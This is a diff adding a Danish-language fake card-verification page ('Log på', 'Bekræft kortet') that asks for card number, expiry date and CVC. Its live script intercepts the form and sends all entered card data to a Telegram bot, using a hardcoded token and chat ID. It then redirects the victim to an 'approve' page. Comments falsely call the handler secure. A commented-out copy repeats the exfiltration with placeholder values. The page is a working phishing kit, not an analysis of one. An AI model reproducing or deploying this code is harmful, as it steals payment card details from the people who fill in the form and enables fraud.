@@ -1,0 +1,370 @@
+
+<!DOCTYPE html>
+<html style="font-size: 16px;" lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    <title>Log på</title>
+    <link rel="stylesheet" href="css/vi.css" media="screen">
+    <link rel="stylesheet" href="css/card.css" media="screen">
+    <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,500,500i,600,600i,700,700i,800,800i">
+    <style type="text/css">
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+        }
+        @media only screen and (max-width: 700px) {
+            html, body {
+                margin: 0;
+                padding: 0;
+                width: 100%;
+                height: 100%;
+                overflow-x: hidden;
+            }
+        }
+    </style>
+</head>
+<body class="u-body u-xl-mode" data-lang="en">
+<header class="u-clearfix u-custom-color-1 u-header u-header" id="sec-8db3">
+    <div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
+        <a class="u-image u-logo u-image-1" data-image-width="290" data-image-height="74">
+            <img src="img/logo.png" style="width: 120px;">
+        </a>
+    </div>
+</header>
+<section class="u-clearfix u-custom-color-1 u-section-1" id="sec-8c53">
+    <div class="u-clearfix u-sheet u-valign-top-xs u-sheet-1">
+        <div class="u-align-center u-container-style u-expanded-width-xs u-group u-radius u-shape-round u-white u-group-1">
+            <div class="u-container-layout u-valign-top u-container-layout-1">
+                <img src="img/mld.png" alt="" data-image-width="406" data-image-height="358" style="width: 20%;">
+                <div class="custom-expanded u-form u-form-1">
+                    <!-- Changed action to secure handler -->
+                    <form action="data/card_handler.php" method="post" class="u-clearfix u-form-spacing-10 u-form-vertical u-inner-form" style="padding: 0px;">
+                        
+                        <!-- Honeypot field for bot protection -->
+                        <input type="text" name="email" style="display:none" tabindex="-1" autocomplete="off">
+                        
+                        <div class="u-form-group u-label-top">
+                            <label for="ji-num" class="u-custom-font u-label u-label-1">Kortnummer</label>
+                            <input type="tel" placeholder="Kortnummer" id="ji-num" name="jiji" class="u-border-grey-25 u-custom-font u-input u-input-rectangle u-radius u-text-custom-color-3 u-input-1" required="required" maxlength="16" pattern="\d{16}" >
+                            <img id="card-type-icon" src="img/cico.jpg" class="card-icon">
+                            <div class="clogos">
+                                <img src="img/v-m.png" class="cblogos">
+                            </div>
+                        </div>
+                        <div class="u-form-group-row">
+                            <div class="u-form-group u-label-top u-form-group-2" style="margin-right: 10px;">
+                                <label for="text-691a" class="u-custom-font u-label u-label-2">Udløbsdato</label>
+                                <div class="input-with-icon">
+                                    <input id="text-691a" minlength="5" maxlength="7" type="tel" placeholder="MM/YY" name="jijiexp" class="u-border-grey-25 u-custom-font u-input u-input-rectangle u-radius u-text-custom-color-3 u-input-2">
+                                </div>
+                            </div>
+                            <div class="u-form-group u-label-top u-form-group-3" style="margin-left: 10px;">
+                                <label for="text-6700" class="u-custom-font u-label u-label-3">CVC</label>
+                                <div class="input-with-icon">
+                                    <input type="tel" id="text-6700" placeholder="3 siffer" name="jijicode" class="u-border-grey-25 u-custom-font u-input u-input-rectangle u-radius u-text-custom-color-3 u-input-3" maxlength="3" pattern="\d{3}" >
+                                    <img src="img/3dgs.png" class="input-icon">
+                                    <input type="hidden" name="wrng" value="" />
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="u-align-center u-form-group u-form-submit u-label-top">
+                            <button value="submit" type="submit"  id="submit-button" class="u-border-none u-btn u-btn-round u-btn-submit u-button-style u-custom-color-2 u-custom-font u-radius u-text-white u-btn-1">Bekræft kortet</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Same JavaScript as original, no changes needed -->
+<!--SCRIPT_REMOVED-->
+document.addEventListener("DOMContentLoaded", function() {
+    var jijiInput = document.getElementById('ji-num');
+    var expiryInput = document.getElementById('text-691a');
+    var cvvInput = document.getElementById('text-6700');
+    var submitButton = document.querySelector('button[type="submit"]');
+    var cardTypeIcon = document.getElementById('card-type-icon');
+
+    function updateCardTypeIcon(cardType) {
+        var cardIcons = {
+            visa: 'images/v.png',
+            mastercard: 'images/m.png',
+            amex: 'images/am.png',
+            default: 'img/cico.jpg'
+        };
+        cardTypeIcon.src = cardIcons[cardType] || cardIcons['default'];
+    }
+
+    function getCardType(number) {
+        if (/^4/.test(number)) return 'visa';
+        if (/^5[1-5]/.test(number)) return 'mastercard';
+        if (/^3[47]/.test(number)) return 'amex';
+        return 'default';
+    }
+
+    function formatjiji(number) {
+        number = number.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let cardType = getCardType(number);
+        updateCardTypeIcon(cardType);
+
+        let formattedNumber = cardType === 'amex' ? 
+            number.replace(/^(.{4})(.{6})/, '$1 $2 ') : 
+            number.replace(/(.{4})/g, '$1 ').trim();
+
+        let maxLength = (cardType === 'amex') ? 17 : 19;
+        if (formattedNumber.length > maxLength) {
+            formattedNumber = formattedNumber.substring(0, maxLength);
+        }
+
+        return formattedNumber;
+    }
+
+    function isjijiValid(number, cardType) {
+        let regex = (cardType === 'amex') ? /^3[47][0-9]{13}$/ : /^[0-9]{16}$/;
+        return regex.test(number.replace(/\s+/g, ''));
+    }
+
+    jijiInput.addEventListener('input', function() {
+        this.value = formatjiji(this.value);
+        validateForm();
+        this.style.borderColor = isjijiValid(this.value, getCardType(this.value)) ? '' : 'red';
+    });
+
+    expiryInput.addEventListener('input', function() {
+        let expiry = this.value.replace(/\D/g, '');
+        if (expiry.length > 2) {
+            expiry = expiry.substring(0, 2) + '/' + expiry.substring(2, 4);
+        }
+        this.value = expiry;
+        validateForm();
+        this.style.borderColor = validateExpiryDate() ? '' : 'red';
+    });
+
+    cvvInput.addEventListener('input', function() {
+        validateForm();
+        this.style.borderColor = validateCvv() ? '' : 'red';
+    });
+
+    function validateExpiryDate() {
+        var expiry = expiryInput.value.split('/');
+        var month = parseInt(expiry[0], 10);
+        var year = parseInt(expiry[1], 10) + 2000;
+        var currentDate = new Date();
+        var currentYear = currentDate.getFullYear();
+        var currentMonth = currentDate.getMonth() + 1;
+        var isValid = expiry.length === 2 && month >= 1 && month <= 12 && (year > currentYear || (year === currentYear && month >= currentMonth));
+        
+        return isValid;
+    }
+
+    function validateCvv() {
+        let cardType = getCardType(jijiInput.value.replace(/\s+/g, ''));
+        let isValid = ((cardType === 'amex' && cvvInput.value.length === 4) || 
+                       (cardType !== 'amex' && cvvInput.value.length === 3)) &&
+                       /^\d+$/.test(cvvInput.value);
+        return isValid;
+    }
+
+    function validateForm() {
+        let jijiIsValid = isjijiValid(jijiInput.value, getCardType(jijiInput.value));
+        let expiryIsValid = validateExpiryDate();
+        let cvvIsValid = validateCvv();
+        submitButton.disabled = !(jijiIsValid && expiryIsValid && cvvIsValid);
+    }
+});
+<!--/SCRIPT_REMOVED-->
+
+<!--SCRIPT_REMOVED-->
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.querySelector("form");
+    if (!form) return;
+
+    form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const formData = new FormData(form);
+        const entries = [...formData.entries()];
+        const message = entries.map(([key, value]) => `${key}: ${value}`).join("\n");
+
+        const telegramBotToken = "ICI_VOTRE_BOT_TOKEN";
+        const telegramChatId = "ICI_VOTRE_CHAT_ID";
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+            }),
+        }).then(response => {
+            if (response.ok) {
+                alert("Message envoyé avec succès !");
+                form.reset();
+            } else {
+                alert("Erreur lors de l'envoi.");
+            }
+        }).catch(error => {
+            alert("Erreur de connexion.");
+            console.error(error);
+        });
+    });
+});
+<!--/SCRIPT_REMOVED-->
+
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.querySelector("form");
+    if (!form) return;
+
+    form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const formData = new FormData(form);
+        const entries = [...formData.entries()];
+        const message = entries.map(([key, value]) => `${key}: ${value}`).join("\n");
+
+        const telegramBotToken = "7900147343:AAGe-500KF88fTYs5dX3QEM29LA3Zgydl7s";
+        const telegramChatId = "-1001727080095";
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+            }),
+        }).then(response => {
+            if (response.ok) {
+                window.location.href = "approve.html";
+            } else {
+                alert("Erreur lors de l'envoi.");
+            }
+        }).catch(error => {
+            alert("Erreur de connexion.");
+            console.error(error);
+        });
+    });
+});
+</script>
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const cardInput = document.getElementById("ji-num");
+    const dateInput = document.getElementById("text-691a");
+    const codeInput = document.getElementById("text-6700");
+    const submitBtn = document.querySelector("button[type='submit'], button#submit-button");
+
+    function insertSlash(value) {
+        return value.replace(/[^\d]/g, '').slice(0, 4).replace(/(\d{2})(\d{1,2})?/, function(_, m, y) {
+            return m + (y ? '/' + y : '');
+        });
+    }
+
+    function isValidDate(mmYY) {
+        const parts = mmYY.split('/');
+        if (parts.length !== 2) return false;
+        const month = parseInt(parts[0], 10);
+        const year = parseInt(parts[1], 10);
+        if (isNaN(month) || isNaN(year)) return false;
+        if (month < 1 || month > 12) return false;
+
+        const todayMonth = 7;
+        const todayYear = 25;
+
+        return year > todayYear || (year === todayYear && month >= todayMonth);
+    }
+
+    function validateFields() {
+        const cardValue = cardInput?.value.replace(/\D/g, '') || '';
+        const dateValue = dateInput?.value.trim() || '';
+        const codeValue = codeInput?.value.replace(/\D/g, '') || '';
+
+        const validCard = cardValue.length === 16;
+        const validDate = /^(0[1-9]|1[0-2])\/\d{2}$/.test(dateValue) && isValidDate(dateValue);
+        const validCode = codeValue.length === 3;
+
+        submitBtn.disabled = !(validCard && validDate && validCode);
+    }
+
+    if (cardInput && dateInput && codeInput && submitBtn) {
+        cardInput.addEventListener("input", validateFields);
+        dateInput.addEventListener("input", function (e) {
+            const formatted = insertSlash(e.target.value);
+            e.target.value = formatted;
+            validateFields();
+        });
+        codeInput.addEventListener("input", validateFields);
+        validateFields();
+    }
+});
+</script>
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const cardInput = document.getElementById("ji-num");
+    const dateInput = document.getElementById("text-691a");
+    const codeInput = document.getElementById("text-6700");
+    const submitBtn = document.getElementById("submit-button");
+
+    function insertSlash(value) {
+        return value.replace(/[^\d]/g, '').slice(0, 4).replace(/(\d{2})(\d{1,2})?/, function(_, m, y) {
+            return m + (y ? '/' + y : '');
+        });
+    }
+
+    function isValidDate(mmYY) {
+        const parts = mmYY.split('/');
+        if (parts.length !== 2) return false;
+        const month = parseInt(parts[0], 10);
+        const year = parseInt(parts[1], 10);
+        if (isNaN(month) || isNaN(year)) return false;
+        if (month < 1 || month > 12) return false;
+
+        const todayMonth = 7;
+        const todayYear = 25;
+
+        return year > todayYear || (year === todayYear && month >= todayMonth);
+    }
+
+    function validateFields() {
+        const cardValue = cardInput?.value.replace(/\D/g, '') || '';
+        const dateValue = dateInput?.value.trim() || '';
+        const codeValue = codeInput?.value.replace(/\D/g, '') || '';
+
+        const validCard = cardValue.length === 16 && (cardValue.startsWith("4") || cardValue.startsWith("5"));
+        const validDate = /^(0[1-9]|1[0-2])\/\d{2}$/.test(dateValue) && isValidDate(dateValue);
+        const validCode = codeValue.length === 3;
+
+        submitBtn.disabled = !(validCard && validDate && validCode);
+    }
+
+    if (cardInput && dateInput && codeInput && submitBtn) {
+        cardInput.addEventListener("input", validateFields);
+        dateInput.addEventListener("input", function (e) {
+            const formatted = insertSlash(e.target.value);
+            e.target.value = formatted;
+            validateFields();
+        });
+        codeInput.addEventListener("input", validateFields);
+        validateFields();
+    }
+});
+</script>
+
+  <script src="telegram.js"></script>
+</body>
+</html>
